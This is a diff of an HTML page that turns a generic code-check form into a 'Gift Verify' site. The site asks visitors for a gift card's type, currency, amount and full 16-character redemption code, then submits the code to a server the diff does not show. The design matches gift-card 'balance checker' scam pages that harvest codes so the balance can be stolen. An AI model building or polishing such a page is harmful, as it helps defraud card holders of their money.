@@ -3,141 +3,195 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Code Check</title>
+<title>Gift Verify</title>
 
 <style>
 body {
   margin: 0;
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
-  background: radial-gradient(circle at top, #1e293b, #020617);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
+  background: #f1f5f9;
+}
+
+/* Header */
+.header {
+  background: linear-gradient(90deg, #6d28d9, #4f46e5);
+  padding: 18px;
   color: white;
+  font-size: 20px;
+  font-weight: bold;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
 }
 
-/* Card */
-.card {
-  background: rgba(15, 23, 42, 0.85);
-  backdrop-filter: blur(10px);
-  padding: 35px;
-  border-radius: 20px;
-  width: 340px;
-  text-align: center;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+.menu {
+  font-size: 24px;
+  cursor: pointer;
 }
 
-/* Hide steps */
-.step {
-  display: none;
+/* Container */
+.container {
+  background: white;
+  margin: -20px auto 20px;
+  padding: 25px;
+  border-radius: 15px;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
 }
 
-.step.active {
+/* Titles */
+h1 {
+  font-size: 22px;
+  margin-bottom: 20px;
+}
+
+/* Inputs */
+label {
   display: block;
-  animation: fadeIn 0.5s ease;
+  margin-top: 15px;
+  font-size: 14px;
+  font-weight: 600;
 }
 
-/* Input */
-input {
+input, select {
   width: 100%;
   padding: 12px;
-  margin-top: 15px;
-  border-radius: 10px;
-  border: 1px solid #334155;
-  background: #020617;
-  color: white;
-  text-align: center;
-  letter-spacing: 2px;
+  margin-top: 8px;
+  border-radius: 8px;
+  border: 1px solid #cbd5e1;
+  font-size: 14px;
 }
 
 /* Button */
 button {
-  margin-top: 15px;
+  margin-top: 20px;
   width: 100%;
-  padding: 12px;
-  background: linear-gradient(90deg, #3b82f6, #2563eb);
+  padding: 14px;
+  background: #4f46e5;
+  color: white;
   border: none;
   border-radius: 10px;
-  color: white;
   font-weight: bold;
   cursor: pointer;
 }
 
 button:hover {
-  transform: scale(1.04);
+  opacity: 0.9;
 }
 
-/* Spinner */
+/* Loader */
 .loader {
-  border: 4px solid #1e293b;
-  border-top: 4px solid #3b82f6;
+  border: 4px solid #e2e8f0;
+  border-top: 4px solid #4f46e5;
   border-radius: 50%;
   width: 35px;
   height: 35px;
-  margin: 20px auto;
+  margin: 40px auto;
   animation: spin 1s linear infinite;
 }
 
-/* Success */
-.success {
-  color: #22c55e;
-  font-size: 18px;
-  margin-top: 15px;
+/* Steps */
+.step {
+  display: none;
+  text-align: center;
 }
 
-/* Error */
+.step.active {
+  display: block;
+}
+
+/* Result */
+.success {
+  color: green;
+}
+
 .error {
-  color: #ef4444;
-  font-size: 14px;
+  color: red;
   margin-top: 10px;
 }
 
-/* Animations */
-@keyframes spin {
-  100% { transform: rotate(360deg); }
+/* Floating button */
+.fab {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #4f46e5;
+  color: white;
+  width: 55px;
+  height: 55px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.2);
 }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(15px); }
-  to { opacity: 1; transform: translateY(0); }
+/* Animation */
+@keyframes spin {
+  100% { transform: rotate(360deg); }
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
-
-  <!-- STEP 1 -->
-  <div class="step active" id="step1">
-    <h2>Secure Code Check</h2>
-    <p>Enter your 16-character code</p>
-
-    <input id="code" maxlength="16" placeholder="ENTER CODE"
-      oninput="this.value = this.value.toUpperCase()">
-
-    <button onclick="goToVerify()">Continue</button>
-
-    <div id="errorMsg" class="error"></div>
-  </div>
-
-  <!-- STEP 2 -->
-  <div class="step" id="step2">
-    <h2>Verifying...</h2>
-    <div class="loader"></div>
-    <p>Please wait while we process your code</p>
-  </div>
-
-  <!-- STEP 3 -->
-  <div class="step" id="step3">
-    <h2 id="resultTitle"></h2>
-    <p id="resultText"></p>
-
-    <button onclick="reset()">Try Again</button>
-  </div>
-
+<!-- Header -->
+<div class="header">
+  <div>✔ Gift Verify</div>
+  <div class="menu">☰</div>
 </div>
+
+<!-- STEP 1 -->
+<div class="container step active" id="step1">
+
+  <h1>Check Card Status</h1>
+
+  <label>Card Type</label>
+  <select>
+    <option>Select Card Type</option>
+    <option>Visa</option>
+    <option>Mastercard</option>
+    <option>Steam</option>
+    <option>Apple</option>
+  </select>
+
+  <label>Currency</label>
+  <select>
+    <option>Select Currency</option>
+    <option>USD</option>
+    <option>EUR</option>
+    <option>GBP</option>
+  </select>
+
+  <label>Card Amount</label>
+  <input type="text" placeholder="Card Amount">
+
+  <label>Redemption Code</label>
+  <input id="code" maxlength="16" placeholder="Enter Code"
+    oninput="this.value = this.value.replace(/[^A-Z0-9]/g,'').toUpperCase()">
+
+  <button onclick="goToVerify()">Check Status</button>
+
+  <div id="errorMsg" class="error"></div>
+</div>
+
+<!-- STEP 2 -->
+<div class="step" id="step2">
+  <h2>Verifying...</h2>
+  <div class="loader"></div>
+</div>
+
+<!-- STEP 3 -->
+<div class="container step" id="step3">
+  <h2 id="resultTitle"></h2>
+  <p id="resultText"></p>
+  <button onclick="reset()">Try Again</button>
+</div>
+
+<!-- Floating Button -->
+<div class="fab">↑</div>
 
 <script>
 function showStep(stepId) {
@@ -151,7 +205,7 @@ async function goToVerify() {
   const code = document.getElementById("code").value;
   const error = document.getElementById("errorMsg");
 
-  if (!/^[A-Za-z0-9]{16}$/.test(code)) {
+  if (!/^[A-Z0-9]{16}$/.test(code)) {
     error.textContent = "Enter a valid 16-character code";
     return;
   }
@@ -172,10 +226,12 @@ async function goToVerify() {
 
     if (data.success) {
       document.getElementById("resultTitle").textContent = "Success";
+      document.getElementById("resultTitle").className = "success";
       document.getElementById("resultText").textContent = "Code accepted";
     } else {
       document.getElementById("resultTitle").textContent = "Invalid Code";
-      document.getElementById("resultText").textContent = "Please try again";
+      document.getElementById("resultTitle").className = "error";
+      document.getElementById("resultText").textContent = data.message || "Please try again";
     }
 
   } catch (err) {
